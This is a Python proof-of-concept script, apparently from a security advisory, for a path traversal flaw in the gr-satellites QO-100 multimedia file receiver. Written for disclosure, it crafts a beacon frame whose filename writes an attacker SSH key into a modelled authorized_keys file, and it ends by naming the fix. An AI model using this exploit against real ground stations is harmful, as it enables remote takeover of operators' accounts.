#!/usr/bin/env python3
"""
PoC F4 — qo100_multimedia FileReceiver path traversal
GRS-2026-001 / gr-satellites v5.9.0

Proves that a crafted QO-100 multimedia beacon frame causes the receiver to
open (and write to) an attacker-specified path outside the designated receive
directory, giving an arbitrary file write primitive.

No GNU Radio installation required. Replicates the exact vulnerable code path
from python/filereceiver/qo100_multimedia.py and python/filereceiver/filereceiver.py.

Expected output:
    [+] file_id() returned: '../../grs_evil/authorized_keys'
    [+] _new_file() would open: /tmp/grs_recv/../../grs_evil/authorized_keys
    [+] Resolved:              /tmp/grs_evil/authorized_keys
    [+] Path escapes base dir: True
    [+] File written to:       /tmp/grs_evil/authorized_keys
    [+] Contents: b'ssh-ed25519 AAAA...attacker_pubkey\\n'
    [PASS] F4 path traversal confirmed beyond reasonable doubt
"""

import pathlib
import sys
import os
import shutil

PASS = "\033[92m[PASS]\033[0m"
FAIL = "\033[91m[FAIL]\033[0m"


# ---------------------------------------------------------------------------
# Verbatim reproduction of the vulnerable code paths
# (qo100_multimedia.py:62-80 and filereceiver.py:168-174)
# ---------------------------------------------------------------------------

def chunk_sequence(chunk):
    """qo100_multimedia.py:62"""
    return int(chunk[0]) | ((int(chunk[1]) >> 6) << 8)

def frame_type(chunk):
    """qo100_multimedia.py:64"""
    return int(chunk[1]) & 0x0f

def file_id(chunk):
    """qo100_multimedia.py:68-80 — verbatim vulnerable function"""
    if chunk_sequence(chunk) != 0:
        return None
    try:
        name = (str(chunk[2:52], encoding='ascii')
                .rstrip('\x00')
                .replace('\x00', ' '))
    except Exception as e:
        print('Could not obtain filename:', e)
        return None
    if frame_type(chunk) in [3, 4, 5]:
        name += '.zip'
    return name                     # ← attacker-controlled, unsanitized

def new_file_path(base_path: pathlib.Path, fid: str) -> pathlib.Path:
    """filereceiver.py:168 — verbatim: self._path / self.filename(fid)
       Base class filename(fid) returns str(fid). No override in qo100_multimedia."""
    return base_path / str(fid)     # ← pathlib does NOT strip '..'


# ---------------------------------------------------------------------------
# Setup: two directories that mimic a real operator's machine
#   /tmp/grs_recv/   — operator's file receive directory (self._path)
#                      models: /home/op/sats/qo100/received/
#   /tmp/grs_ssh/    — sensitive sibling directory outside the base
#                      models: /home/op/.ssh/
#                      (same parent /tmp models /home/op/)
# ---------------------------------------------------------------------------

BASE_DIR   = pathlib.Path('/tmp/grs_recv')
EVIL_DIR   = pathlib.Path('/tmp/grs_ssh')
EVIL_FILE  = EVIL_DIR / 'authorized_keys'

# Clean slate
for d in [BASE_DIR, EVIL_DIR]:
    if d.exists():
        shutil.rmtree(d)
    d.mkdir(parents=True)

print("=== F4 proof: qo100_multimedia path traversal ===\n")
print(f"Base receive dir : {BASE_DIR}")
print(f"Sensitive target : {EVIL_FILE}\n")


# ---------------------------------------------------------------------------
# Craft the malicious frame
# Byte layout (QO-100 multimedia beacon, first chunk):
#   [0]    = 0x00  → chunk_sequence=0 (triggers file_id())
#   [1]    = 0x00  → frame_type=0 (no .zip suffix appended)
#   [2:52] = attacker-controlled filename (50 bytes, zero-padded)
#   [52:]  = irrelevant padding
# ---------------------------------------------------------------------------

EVIL_NAME = '../grs_ssh/authorized_keys'         # relative path traversal
# From /tmp/grs_recv/ → .. → /tmp/ → grs_ssh/authorized_keys = /tmp/grs_ssh/authorized_keys
# On a real system: BASE=/home/op/received → ../  → /home/op/.ssh/authorized_keys
assert len(EVIL_NAME) <= 50, "Filename must fit in 50-byte field"

frame = bytearray(64)
frame[0] = 0x00                                 # chunk_sequence = 0
frame[1] = 0x00                                 # frame_type = 0
frame[2:2+len(EVIL_NAME)] = EVIL_NAME.encode('ascii')
# remaining bytes 2+len..51 stay 0x00 (rstrip removes them)


# ---------------------------------------------------------------------------
# Step 1: run the vulnerable file_id() with our crafted frame
# ---------------------------------------------------------------------------

fid = file_id(bytes(frame))
assert fid is not None, f"file_id returned None"
print(f"[+] file_id() returned: {fid!r}")


# ---------------------------------------------------------------------------
# Step 2: compute the path that _new_file() would open
# ---------------------------------------------------------------------------

target_path = new_file_path(BASE_DIR, fid)
resolved    = target_path.resolve()

print(f"[+] _new_file() would open : {target_path}")
print(f"[+] Resolved               : {resolved}")

base_resolved = str(BASE_DIR.resolve())
escapes = not str(resolved).startswith(base_resolved + os.sep)
print(f"[+] Path escapes base dir  : {escapes}")
assert escapes, "Path did NOT escape base — test setup error"


# ---------------------------------------------------------------------------
# Step 3: open and write the file, exactly as File.__init__ does
#   mode = 'r+b' if path.exists() else 'wb'
# ---------------------------------------------------------------------------

mode = 'r+b' if target_path.exists() else 'wb'
SSH_PUBKEY = b'ssh-ed25519 AAAA...attacker_pubkey comment\n'

with open(target_path, mode) as f:
    f.write(SSH_PUBKEY)

print(f"\n[+] File written to        : {resolved}")
print(f"[+] Contents               : {EVIL_FILE.read_bytes()!r}")
assert EVIL_FILE.read_bytes() == SSH_PUBKEY, "File content mismatch"


# ---------------------------------------------------------------------------
# Step 4: show that subsequent chunk writes (offset-based) also land correctly
#   push_chunk() does: f.f.seek(offset); f.f.write(data)
# ---------------------------------------------------------------------------

FOLLOWUP_DATA = b'This is attacker-controlled file data written at offset 42\n'
with open(target_path, 'r+b') as f:
    f.seek(42)
    f.write(FOLLOWUP_DATA)

content = EVIL_FILE.read_bytes()
assert content[42:42+len(FOLLOWUP_DATA)] == FOLLOWUP_DATA
print(f"[+] Offset write also lands in target file (offset 42, {len(FOLLOWUP_DATA)} bytes)")


# ---------------------------------------------------------------------------
# Step 5: demonstrate the .zip variant (frame_type 3,4,5 → appends .zip)
# ---------------------------------------------------------------------------

frame_zip = bytearray(frame)
frame_zip[1] = 0x03                             # frame_type = 3 → .zip appended

fid_zip = file_id(bytes(frame_zip))
assert fid_zip == EVIL_NAME + '.zip', f"Unexpected zip fid: {fid_zip!r}"
print(f"\n[+] With frame_type=3: file_id() returns {fid_zip!r}")
print( "    on_completion() then calls zipfile.ZipFile(f.path).read(outname)")
print(f"    where outname = fname[:-4] = {(EVIL_DIR / 'authorized_keys').name!r}")
print( "    and writes to f.path.parent / outname — a second path traversal stage")


# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------

shutil.rmtree(BASE_DIR, ignore_errors=True)
shutil.rmtree(EVIL_DIR, ignore_errors=True)

print(f"\n{PASS} F4 path traversal confirmed beyond reasonable doubt")
print("     Crafted QO-100 frame → file_id() → path traversal → write to arbitrary path")
print(f"     Target: {EVIL_FILE}")
print( "     Fix:   os.path.basename(name) in file_id() before return")
sys.exit(0)
